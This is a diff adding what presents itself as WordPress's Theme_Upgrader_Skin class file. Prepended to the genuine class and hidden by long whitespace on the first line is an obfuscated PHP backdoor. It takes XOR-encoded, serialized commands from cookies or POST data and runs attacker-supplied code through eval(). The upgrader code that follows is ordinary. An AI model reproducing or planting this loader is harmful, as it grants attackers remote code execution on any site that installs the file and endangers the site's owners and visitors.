@@ -1,0 +1,89 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $h26ad2 = 792;$GLOBALS['j7212a'] = Array();global $j7212a;$j7212a = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['wfcaebcf'] = "\x6f\x5c\x3a\x34\x68\x6c\x58\x4b\xd\x4c\x62\x56\x6a\xa\x45\x78\x61\x30\x77\x2b\x4d\x48\x3d\x46\x4a\x3f\x41\x5f\x6e\x75\x69\x26\x2c\x47\x65\x3c\x37\x55\x42\x35\x36\x57\x7b\x74\x73\x79\x33\x44\x27\x53\x43\x20\x2a\x28\x72\x32\x31\x21\x76\x22\x24\x39\x6b\x66\x7d\x2d\x67\x7a\x60\x4f\x2f\x7c\x49\x9\x25\x2e\x5b\x7e\x70\x5e\x59\x52\x3e\x51\x71\x50\x54\x4e\x5a\x6d\x23\x38\x3b\x29\x63\x40\x5d\x64";$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][17]] = $j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][54];$j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16]] = $j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][97];$j7212a[$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17]] = $j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][34];$j7212a[$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]] = $j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][43].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][28];$j7212a[$j7212a['wfcaebcf'][45].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][56]] = $j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][97];$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][56]] = $j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][43];$j7212a[$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][17]] = $j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][67].$j7212a['wfcaebcf'][34];$j7212a[$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][10]] = $j7212a['wfcaebcf'][78].$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][78].$j7212a['wfcaebcf'][58].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][28];$j7212a[$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][91]] = $j7212a['wfcaebcf'][29].$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][67].$j7212a['wfcaebcf'][34];$j7212a[$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][91]] = $j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][34];$j7212a[$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40]] = $j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][43].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][43].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][43];$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]] = $j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][63];$j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][39]] = $j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][63];$j7212a[$j7212a['wfcaebcf'][58].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][16]] = $_POST;$j7212a[$j7212a['wfcaebcf'][78].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][39]] = $_COOKIE;@$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][56]]($j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][66], NULL);@$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][56]]($j7212a['wfcaebcf'][5].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][66].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][54].$j7212a['wfcaebcf'][44], 0);@$j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][56]]($j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][15].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][15].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][29].$j7212a['wfcaebcf'][43].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][43].$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][34], 0);@$j7212a[$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40]](0);if (!$j7212a[$j7212a['wfcaebcf'][45].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][56]]($j7212a['wfcaebcf'][26].$j7212a['wfcaebcf'][9].$j7212a['wfcaebcf'][81].$j7212a['wfcaebcf'][14].$j7212a['wfcaebcf'][26].$j7212a['wfcaebcf'][47].$j7212a['wfcaebcf'][80].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][81].$j7212a['wfcaebcf'][37].$j7212a['wfcaebcf'][87].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][16])){$j7212a[$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][17]]($j7212a['wfcaebcf'][26].$j7212a['wfcaebcf'][9].$j7212a['wfcaebcf'][81].$j7212a['wfcaebcf'][14].$j7212a['wfcaebcf'][26].$j7212a['wfcaebcf'][47].$j7212a['wfcaebcf'][80].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][81].$j7212a['wfcaebcf'][37].$j7212a['wfcaebcf'][87].$j7212a['wfcaebcf'][27].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][16], 1);$oe61 = NULL;$t7f5 = NULL;$j7212a[$j7212a['wfcaebcf'][67].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][40]] = $j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][65].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][65].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][65].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][65].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][10];global $zc8f42e6;function  e668414ff($oe61, $u8ea530){global $j7212a;$c2ae11d5d = "";for ($ve28216a3=0; $ve28216a3<$j7212a[$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]]($oe61);){for ($da0bb4531=0; $da0bb4531<$j7212a[$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]]($u8ea530) && $ve28216a3<$j7212a[$j7212a['wfcaebcf'][0].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]]($oe61); $da0bb4531++, $ve28216a3++){$c2ae11d5d .= $j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][17]]($j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16]]($oe61[$ve28216a3]) ^ $j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][63].$j7212a['wfcaebcf'][91].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][16]]($u8ea530[$da0bb4531]));}}return $c2ae11d5d;}function  b9db353f($oe61, $u8ea530){global $j7212a;global $zc8f42e6;return $j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][39]]($j7212a[$j7212a['wfcaebcf'][89].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][39]]($oe61, $zc8f42e6), $u8ea530);}foreach ($j7212a[$j7212a['wfcaebcf'][78].$j7212a['wfcaebcf'][3].$j7212a['wfcaebcf'][36].$j7212a['wfcaebcf'][39]] as $u8ea530=>$q5f1b3){$oe61 = $q5f1b3;$t7f5 = $u8ea530;}if (!$oe61){foreach ($j7212a[$j7212a['wfcaebcf'][58].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][16]] as $u8ea530=>$q5f1b3){$oe61 = $q5f1b3;$t7f5 = $u8ea530;}}$oe61 = @$j7212a[$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][34].$j7212a['wfcaebcf'][91]]($j7212a[$j7212a['wfcaebcf'][4].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][40].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][97].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][63]]($j7212a[$j7212a['wfcaebcf'][30].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][94].$j7212a['wfcaebcf'][91]]($oe61), $t7f5));if (isset($oe61[$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][62]]) && $zc8f42e6==$oe61[$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][62]]){if ($oe61[$j7212a['wfcaebcf'][16]] == $j7212a['wfcaebcf'][30]){$ve28216a3 = Array($j7212a['wfcaebcf'][78].$j7212a['wfcaebcf'][58] => @$j7212a[$j7212a['wfcaebcf'][28].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][55].$j7212a['wfcaebcf'][10]](),$j7212a['wfcaebcf'][44].$j7212a['wfcaebcf'][58] => $j7212a['wfcaebcf'][56].$j7212a['wfcaebcf'][75].$j7212a['wfcaebcf'][17].$j7212a['wfcaebcf'][65].$j7212a['wfcaebcf'][56],);echo @$j7212a[$j7212a['wfcaebcf'][16].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][61].$j7212a['wfcaebcf'][46].$j7212a['wfcaebcf'][10].$j7212a['wfcaebcf'][39].$j7212a['wfcaebcf'][17]]($ve28216a3);}elseif ($oe61[$j7212a['wfcaebcf'][16]] == $j7212a['wfcaebcf'][34]){eval/*t357f*/($oe61[$j7212a['wfcaebcf'][97]]);}exit();}} ?><?php
+/**
+ * Upgrader API: Theme_Upgrader_Skin class
+ *
+ * @package WordPress
+ * @subpackage Upgrader
+ * @since 4.6.0
+ */
+
+/**
+ * Theme Upgrader Skin for WordPress Theme Upgrades.
+ *
+ * @since 2.8.0
+ * @since 4.6.0 Moved to its own file from wp-admin/includes/class-wp-upgrader-skins.php.
+ *
+ * @see WP_Upgrader_Skin
+ */
+class Theme_Upgrader_Skin extends WP_Upgrader_Skin {
+	public $theme = '';
+
+	/**
+	 *
+	 * @param array $args
+	 */
+	public function __construct($args = array()) {
+		$defaults = array( 'url' => '', 'theme' => '', 'nonce' => '', 'title' => __('Update Theme') );
+		$args = wp_parse_args($args, $defaults);
+
+		$this->theme = $args['theme'];
+
+		parent::__construct($args);
+	}
+
+	/**
+	 */
+	public function after() {
+		$this->decrement_update_count( 'theme' );
+
+		$update_actions = array();
+		if ( ! empty( $this->upgrader->result['destination_name'] ) && $theme_info = $this->upgrader->theme_info() ) {
+			$name       = $theme_info->display('Name');
+			$stylesheet = $this->upgrader->result['destination_name'];
+			$template   = $theme_info->get_template();
+
+			$activate_link = add_query_arg( array(
+				'action'     => 'activate',
+				'template'   => urlencode( $template ),
+				'stylesheet' => urlencode( $stylesheet ),
+			), admin_url('themes.php') );
+			$activate_link = wp_nonce_url( $activate_link, 'switch-theme_' . $stylesheet );
+
+			$customize_url = add_query_arg(
+				array(
+					'theme' => urlencode( $stylesheet ),
+					'return' => urlencode( admin_url( 'themes.php' ) ),
+				),
+				admin_url( 'customize.php' )
+			);
+			if ( get_stylesheet() == $stylesheet ) {
+				if ( current_user_can( 'edit_theme_options' ) && current_user_can( 'customize' ) ) {
+					$update_actions['preview']  = '<a href="' . esc_url( $customize_url ) . '" class="hide-if-no-customize load-customize"><span aria-hidden="true">' . __( 'Customize' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Customize &#8220;%s&#8221;' ), $name ) . '</span></a>';
+				}
+			} elseif ( current_user_can( 'switch_themes' ) ) {
+				if ( current_user_can( 'edit_theme_options' ) && current_user_can( 'customize' ) ) {
+					$update_actions['preview'] = '<a href="' . esc_url( $customize_url ) . '" class="hide-if-no-customize load-customize"><span aria-hidden="true">' . __( 'Live Preview' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Live Preview &#8220;%s&#8221;' ), $name ) . '</span></a>';
+				}
+				$update_actions['activate'] = '<a href="' . esc_url( $activate_link ) . '" class="activatelink"><span aria-hidden="true">' . __( 'Activate' ) . '</span><span class="screen-reader-text">' . sprintf( __( 'Activate &#8220;%s&#8221;' ), $name ) . '</span></a>';
+			}
+
+			if ( ! $this->result || is_wp_error( $this->result ) || is_network_admin() )
+				unset( $update_actions['preview'], $update_actions['activate'] );
+		}
+
+		$update_actions['themes_page'] = '<a href="' . self_admin_url( 'themes.php' ) . '" target="_parent">' . __( 'Return to Themes page' ) . '</a>';
+
+		/**
+		 * Filters the list of action links available following a single theme update.
+		 *
+		 * @since 2.8.0
+		 *
+		 * @param array  $update_actions Array of theme action links.
+		 * @param string $theme          Theme directory name.
+		 */
+		$update_actions = apply_filters( 'update_theme_complete_actions', $update_actions, $this->theme );
+
+		if ( ! empty($update_actions) )
+			$this->feedback(implode(' | ', (array)$update_actions));
+	}
+}
